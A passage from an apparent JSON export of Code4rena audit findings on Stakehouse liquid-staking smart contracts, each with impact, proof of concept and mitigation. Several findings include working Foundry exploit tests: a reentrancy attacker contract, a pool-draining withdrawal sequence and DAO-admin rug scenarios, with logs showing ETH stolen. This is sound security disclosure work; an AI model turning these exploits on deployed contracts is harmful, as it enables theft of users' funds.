_newLPToken.totalSupply() <= maxStakingAmountPerValidator, \"Not enough mintable tokens\"); ```  and change from  ```solidity /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {  address associatedSmartWallet = smartWalletOfKnot[blsPubKey];  require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");   LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);  require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");  require(stakingFundsLP.totalSupply() >= 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");   LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);  require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");  require(savETHVaultLP.totalSupply() >= 24 ether, \"KNOT must have 24 ETH in savETH vault\"); } ```  we change from == balance check to >=, because == balance check is too strict in this case."}, {"title": "function withdrawETH from GiantMevAndFeesPool can steal most of eth because of idleETH is reduced before burning token", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-08"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90   # Vulnerability details  ## Impact  The contract GiantMevAndFeesPool override the function totalRewardsReceived: ``` return address(this).balance + totalClaimed - idleETH; ``` The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP` ``` uint256 received = totalRewardsReceived(); uint256 unprocessed = received - totalETHSeen; ``` But it will decrease the `idleETH` first and then burn the lpTokenETH in the function `GiantMevAndFeesPool.withdrawETH`. The lpTokenETH burn option will trigger `GiantMevAndFeesPool.beforeTokenTransfer` which will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.  ## Proof of Concept I wrote a test file for proof, but there is another bug/vulnerability which will make the `GiantMevAndFeesPool.withdrawETH` function break down. I submitted it as the other finding named \"GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool\". You should fix it first by modifying the code https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166 to : ``` if (_to != address(0)) {     _distributeETHRewardsToUserForToken(         _to,         address(lpTokenETH),         lpTokenETH.balanceOf(_to),         _to     ); } ``` I know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.  test: test/foundry/TakeFromGiantPools2.t.sol ``` pragma solidity ^0.8.13;  // SPDX-License-Identifier: MIT  import \"forge-std/console.sol\"; import {GiantPoolTests} from \"./GiantPools.t.sol\";  contract TakeFromGiantPools2 is GiantPoolTests {     function testDWUpdateRate2() public{         address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);         address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);         // Deposit ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();         vm.startPrank(feesAndMevUserTwo);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         giantFeesAndMevPool.withdrawETH(4 ether);         vm.stopPrank();         console.log(\"user one:\", getBalance(feesAndMevUserOne));         console.log(\"user two(attacker):\", getBalance(feesAndMevUserTwo));         console.log(\"giantFeesAndMevPool:\", getBalance(address(giantFeesAndMevPool)));     }      function getBalance(address addr) internal returns (uint){         // just ETH         return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);     }  } ``` run test: ``` forge test --match-test testDWUpdateRate2 -vvv ```  test log: ``` Logs:   user one: 0   user two(attacker): 6000000000000000000   giantFeesAndMevPool: 2000000000000000000 ```  The attacker stole 2 eth from the pool.  ## Tools Used foundry  ## Recommended Mitigation Steps `idleETH -= _amount;` should be after the `lpTokenETH.burn`."}, {"title": "BringUnusedETHBackIntoGiantPool can cause stuck ether funds in Giant Pool", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-06"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137-L158   # Vulnerability details  ## Impact withdrawUnusedETHToGiantPool will withdraw any eth from the vault if staking has not commenced(knot status is INITIALS_REGISTERED), the eth will be drawn successful to the giant pool. However, idleETH variable is not updated. idleETH  is the available ETH for withdrawing and depositing eth for staking. Since there is no other places that updates idleETH other than depositing eth for staking and withdrawing eth, the eth withdrawn from the vault will be stuck forever.   ## Proof of Concept place poc in GiantPools.t.sol with `import { MockStakingFundsVault } from \"../../contracts/testing/liquid-staking/MockStakingFundsVault.sol\";`   ```solidity     function testStuckFundsInGiantMEV() public {          stakingFundsVault = MockStakingFundsVault(payable(manager.stakingFundsVault()));         address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);         //address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         //address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);         address victim = accountFour; vm.deal(victim, 1 ether);           registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          emit log_address(address(giantFeesAndMevPool));         vm.startPrank(victim);          emit log_uint(victim.balance);         giantFeesAndMevPool.depositETH{value: 1 ether}(1 ether);         bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(1 ether);         giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);          emit log_uint(victim.balance);           vm.warp(block.timestamp + 60 minutes);         LPToken lp = (stakingFundsVault.lpTokenForKnot(blsKeysForVaults[0][0]));         LPToken [][] memory lpToken = new LPToken[][](1);         LPToken[] memory temp  = new LPToken[](1);         temp[0] = lp;         lpToken[0] = temp;          emit log_uint(address(giantFeesAndMevPool).balance);         giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(stakingFundsVault)),lpToken, stakeAmountsForVaults);          emit log_uint(address(giantFeesAndMevPool).balance);         vm.expectRevert();         giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(stakingFundsVault)),getUint256ArrayFromValues(1 ether) , blsKeysForVaults, stakeAmountsForVaults);          vm.expectRevert();         giantSavETHPool.withdrawETH(1 ether);          vm.stopPrank();     }   ```  both withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH  Note that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.  ## Tools Used  Foundry  ## Recommended Mitigation Steps update `idleETH`  in withdrawUnusedETHToGiantPool"}, {"title": "Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet.", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/110", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-05"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347   # Vulnerability details  ## Impact  Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet  ## Proof of Concept  the code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.  ```solidity     /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.     /// @dev A banned node runner cannot withdraw ETH for the KNOT.      /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {         require(_recipient != address(0), \"Zero address\");         require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");          address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];         require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");         require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");         require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             \"Initials not registered\"         );          // refund 4 ether from smart wallet to node runner's EOA         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             \"\",             4 ether         );          // update the mapping         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;          emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);     } ```  note the section:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  \"\",  4 ether );  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet; ```  if the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.  As shown in our running POC.  We need to add the import first:   ```solidity import { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\"; ```  We can add the smart contract below:  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity interface IManager {     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable;     function withdrawETHForKnot(         address _recipient,          bytes calldata _blsPublicKeyOfKnot     ) external; }  contract NonEOARepresentative {      address manager;     bool state;      constructor(address _manager) payable {          bytes[] memory publicKeys = new bytes[](2);         publicKeys[0] = \"publicKeys1\";         publicKeys[1] = \"publicKeys2\";          bytes[] memory signature = new bytes[](2);         signature[0] = \"signature1\";         signature[1] = \"signature2\";          IManager(_manager).registerBLSPublicKeys{value: 8 ether}(             publicKeys,             signature,             address(this)         );          manager = _manager;      }      function withdraw(bytes calldata _blsPublicKeyOfKnot) external {         IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);     }      receive() external payable {         if(!state) {             state = true;             this.withdraw(\"publicKeys1\");         }     }  } ```  there is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.  We add the test case.  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  ```solidity function testBypassIsContractCheck_POC() public {   NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));  address wallet = manager.smartWalletOfNodeRunner(address(pass));  address reprenstative = manager.smartWalletRepresentative(wallet);  console.log(\"smart contract registered as a EOA representative\");  console.log(address(reprenstative) == address(pass));   // to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED  MockAccountManager(factory.accountMan()).setLifecycleStatus(\"publicKeys1\", 1);   // expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER  pass.withdraw(\"publicKeys1\");  console.log(\"balance after the withdraw, expected 4 ETH, but has 8 ETH\");  console.log(address(pass).balance);  } ```  we run the test:  ```solidity forge test -vv --match testWithdraw_Reentrancy_POC ```  and the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testWithdraw_Reentrancy_POC() (gas: 578021) Logs:   smart contract registered as a EOA representative   true   balance after the withdraw, expected 4 ETH, but has 8 ETH   8000000000000000000  Test result: ok. 1 passed; 0 failed; finished in 14.85ms ```  the function call is   pass.withdraw(\"publicKeys1\"), which calls  ```solidity function withdraw(bytes calldata _blsPublicKeyOfKnot) external {  IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot); } ```  which trigger:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  \"\",  4 ether ); ```  which triggers reentrancy to withdraw the fund again before the public key is banned.  ```solidity receive() external payable {  if(!state) {   state = true;   this.withdraw(\"publicKeys1\");  } } ```   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.  ```solidity  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;  // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  \"\",  4 ether ); ```"}, {"title": "DAO or lsdn owner can steal funds from node runner", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-09"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377   # Vulnerability details  ## Impact DAO or lsd network owner can swap node runner of the smart contract to their own eoa, allowing them to withdrawETH or claim rewards from node runner.   ## Proof of Concept there are no checks done when swapping the node runner whether there are funds in the smart contract that belongs to the node runner. Therefore, a malicious dao or lsd network owner can simply swap them out just right after the node runner has deposited 4 ether in the smart wallet.  place poc in LiquidStakingManager.sol  ```solidity     function testDaoCanTakeNodeRunner4ETH() public {         address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);         address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);         address attacker = accountFour;           registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          vm.startPrank(admin);         manager.rotateNodeRunnerOfSmartWallet(nodeRunner, attacker, true);          vm.stopPrank();          vm.startPrank(attacker);         emit log_uint(attacker.balance);         manager.withdrawETHForKnot(attacker,blsPubKeyOne);         emit log_uint(attacker.balance);         vm.stopPrank();     }  ```  ## Tools Used  forge  ## Recommended Mitigation Steps Send back outstanding ETH and rewards that belongs to node runner if swapping is needed. "}, {"title": "Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63   # Vulnerability details  ## Impact  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.  ## Proof of Concept  After the Liquid Staking Manager.so is deployed via LSDNFactory::deployNewLiquidStakingDerivativeNetwork,  ```solidity /// @notice Deploys a new LSDN and the liquid staking manger required to manage the network /// @param _dao Address of the entity that will govern the liquid staking network /// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars) function deployNewLiquidStakingDerivativeNetwork(  address _dao,  uint256 _optionalCommission,  bool _deployOptionalHouseGatekeeper,  string calldata _stakehouseTicker ) public returns (address) { ```  The dao address governance address (contract) has very high privilege.  The dao address can perform arbitrary execution by calling LiquidStakingManager.sol::executeAsSmartWallet  ```solidity /// @notice Enable operations proxied through DAO contract to another contract /// @param _nodeRunner Address of the node runner that created the wallet /// @param _to Address of the target contract /// @param _data Encoded data of the function call /// @param _value Total value attached to the transaction function executeAsSmartWallet(  address _nodeRunner,  address _to,  bytes calldata _data,  uint256 _value ) external payable onlyDAO {  address smartWallet = smartWalletOfNodeRunner[_nodeRunner];  require(smartWallet != address(0), \"No wallet found\");  IOwnableSmartWallet(smartWallet).execute(   _to,   _data,   _value  ); } ```  When a register a new node operator with 4 ETH by calling registerBLSPublicKeys:  ```solidity /// @notice register a node runner to LSD by creating a new smart wallet /// @param _blsPublicKeys list of BLS public keys /// @param _blsSignatures list of BLS signatures /// @param _eoaRepresentative EOA representative of wallet function registerBLSPublicKeys(  bytes[] calldata _blsPublicKeys,  bytes[] calldata _blsSignatures,  address _eoaRepresentative ) external payable nonReentrant { ```  the smart wallet created in the smart contract custody the 4 ETH.  ```solidity // create new wallet owned by liquid staking manager smartWallet = smartWalletFactory.createWallet(address(this)); emit SmartWalletCreated(smartWallet, msg.sender); ```  ```solidity {  // transfer ETH to smart wallet  (bool result,) = smartWallet.call{value: msg.value}(\"\");  require(result, \"Transfer failed\");  emit WalletCredited(smartWallet, msg.value); } ```  but  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.  **As shown in POC:**  first we add this smart contract in LiquidStakingManager.t.sol  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity import { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";  contract RugContract {      function receiveFund() external payable {      }      receive() external payable {} }  contract MockToken is ERC20 {      constructor()ERC20(\"A\", \"B\") {         _mint(msg.sender, 10000 ether);     }  } ```  **We add the two POC,**   https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  the first POC shows the admin can steal the ETH from the smart contract via arbrary execution.  ```solidity     function testDaoRugFund_Pull_ETH_POC() public {                  address user = vm.addr(21312);          bytes[] memory publicKeys = new bytes[](1);         publicKeys[0] = \"publicKeys\";          bytes[] memory signature = new bytes[](1);         signature[0] = \"signature\";          RugContract rug = new RugContract();          // user spends 4 ehter and register the key to become the public operator         vm.prank(user);         vm.deal(user, 4 ether);         manager.registerBLSPublicKeys{value: 4 ether}(             publicKeys,             signature,             user         );         address wallet = manager.smartWalletOfNodeRunner(user);         console.log(\"wallet ETH balance for user after registering\");         console.log(wallet.balance);          // dao admin rug the user by withdraw the ETH via arbitrary execution.         vm.prank(admin);         bytes memory data = abi.encodeWithSelector(RugContract.receiveFund.selector, \"\");         manager.executeAsSmartWallet(             user,             address(rug),             data,             4 ether         );         console.log(\"wallet ETH balance for user after DAO admin rugging\");         console.log(wallet.balance);      } ```  We run the test:  ```solidity forge test -vv --match testDaoRugFund_Pull_ETH_POC ```  the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testDaoRugFund_Pull_ETH_POC() (gas: 353826) Logs:   wallet ETH balance for user after registering   4000000000000000000   wallet ETH balance for user after DAO admin rugging   0  Test result: ok. 1 passed; 0 failed; finished in 13.63ms ```  the second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.  ```solidity     function testDaoRugFund_Pull_ERC20_Token_POC() public {          address user = vm.addr(21312);          bytes[] memory publicKeys = new bytes[](1);         publicKeys[0] = \"publicKeys\";          bytes[] memory signature = new bytes[](1);         signature[0] = \"signature\";          RugContract rug = new RugContract();          vm.prank(user);         vm.deal(user, 4 ether);         manager.registerBLSPublicKeys{value: 4 ether}(             publicKeys,             signature,             user         );          address wallet = manager.smartWalletOfNodeRunner(user);         ERC20 token = new MockToken();         token.transfer(wallet, 100 ether);          console.log(\"wallet ERC20 token balance for user after registering\");         console.log(token.balanceOf(wallet));          vm.prank(admin);         bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(rug), 100 ether);         manager.executeAsSmartWallet(             user,             address(token),             data,             0         );          console.log(\"wallet ERC20 token balance for dao rugging\");         console.log(token.balanceOf(wallet));      } ```  We run the test:  ```solidity forge test -vv --match testDaoRugFund_Pull_ERC20_Token_POC ```  the running result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testDaoRugFund_Pull_ERC20_Token_POC() (gas: 940775) Logs:   wallet ERC20 token balance for user after registering   100000000000000000000   wallet ERC20 token balance for dao rugging   0  Test result: ok. 1 passed; 0 failed; finished in 16.99ms ```   ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend not give the dao admin the priviledge to perform arbitrary execution to access user's fund."}, {"title": "OwnableSmartWallet: Multiple approvals can lead to unwanted ownership transfers", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/99", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106   # Vulnerability details  ## Impact The `OwnableSmartWallet` contract employs a mechanism for the owner to approve addresses that can then claim ownership ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L94)) of the contract.    The source code has a comment included which states that \"Approval is revoked, in order to avoid unintended transfer allowance if this wallet ever returns to the previous owner\" ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L105-L106)).    This means that when ownership is transferred from User A to User B, the approvals that User A has given should be revoked.    The existing code does not however revoke all approvals that User A has given. It only revokes one approval.    This can lead to unwanted transfers of ownership.    ## Proof of Concept 1. User A approves User B and User C to claim ownership 2. User B claims ownership first 3. Only User A's approval for User B is revoked, not however User A's approval for User C 4. User B transfers ownerhsip back to User A 5. Now User C can claim ownership even though this time User A has not approved User C  ## Tools Used VSCode  ## Recommended Mitigation Steps You should invalidate all approvals User A has given when another User becomes the owner of the OwnableSmartWallet.    Unfortunately you cannot use a statement like `delete _isTransferApproved[owner()]`.    So you would need an array that keeps track of approvals as pointed out in this StackExchange question: [https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping](https://ethereum.stackexchange.com/questions/15553/how-to-delete-a-mapping)   "}, {"title": "Withdrawing wrong LPToken from GiantPool leads to loss of funds", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-06"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95   # Vulnerability details  ## Impact The `GiantPoolBase.withdrawLPTokens` function ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69)) allows to withdraw LP tokens from a GiantPool by burning an equal amount of GiantLP.    This allows a user to handle the LP tokens directly without the need for a GiantPool as intermediary.    It is not checked however whether the LP tokens to be withdrawn were transferred to the GiantPool in exchange for staking ETH.    I.e. whether the LP token are of any value.    There are two issues associated with this behavior.    1. A malicious user can create and mint his own LP Token and send it to the GiantPool. Users that want to withdraw LP tokens from the GiantPool can then be tricked into withdrawing worthless attacker LP tokens, thereby burning their GiantLP tokens that are mapped 1:1 to  ETH. (-> loss of funds)    2. This can also mess up internal accounting logic. For every LP token that is owned by a GiantPool there should be a corresponding GiantLP token. Using the described behavior this ratio can be broken such that there are LP token owned by the GiantPool for which there is no GiantLP token. This means some LP token cannot be transferred from the GiantPool and there will always be some amount of LP token \"stuck\" in the GiantPool.    ## Proof of Concept 1. The attacker deploys his own LPToken contract and sends a huge amount of LP tokens to the GiantPool to pass the check in `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L95)).  2. The attacker tricks Bob into withdrawing the malicious LP tokens from the GiantPool ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69)).  3. Bob's GiantLP tokens are burnt and he receives worthless LP tokens.  The same issue exists for the `GiantSavETHVaultPool.withdrawDETH` function.   But in this case, the victim must also provide a wrong savETHVault address which makes this issue less likely to be exploited.    ## Tools Used VSCode  ## Recommended Mitigation Steps The GiantPool should store information about which LP tokens it receives for staking ETH.  When calling the `GiantPoolBase.withdrawLPTokens` function it can then be checked if the LP tokens to be withdrawn were indeed transferred to the GiantPool in exchange for staking ETH."}, {"title": "GiantPool should not check ETH amount on withdrawal", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/92", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53   # Vulnerability details  ## Impact The `GiantPoolBase.withdrawETH` function requires that the amount to withdraw is at least as big as the `MIN_STAKING_AMOUNT` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L53)).    This check does not serve any purpose and can actually cause the user problems when withdrawing his ETH.    ## Proof of Concept 1. Bob deposits ETH into the GiantPool with the `GiantPoolBase.depositETH` function.      The amount is equal to `MIN_STAKING_AMOUNT + 0.99 * MIN_STAKING_AMOUNT`. 2. Bob witdraws `MIN_STAKING_AMOUNT` ETH from the GiantPool.   3. Bob has `0.99 * MIN_STAKING_AMOUNT` ETH left in the GiantPool. This is a problem since he cannot withdraw this amount of ETH since it is smaller than `MIN_STAKING_AMOUNT`.      In order to withdraw his funds, Bob needs to first add funds to the GiantPool such that the deposited amount is big enough for withdrawal.  However this causes extra transaction fees to be paid (loss of funds) and causes a bad user experience.    ## Tools Used VSCode  ## Recommended Mitigation Steps The `require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");` statement should just be removed. It does not serve any purpose anyway.  "}, {"title": "Unstaking does not update the mapping `sETHUserClaimForKnot`", 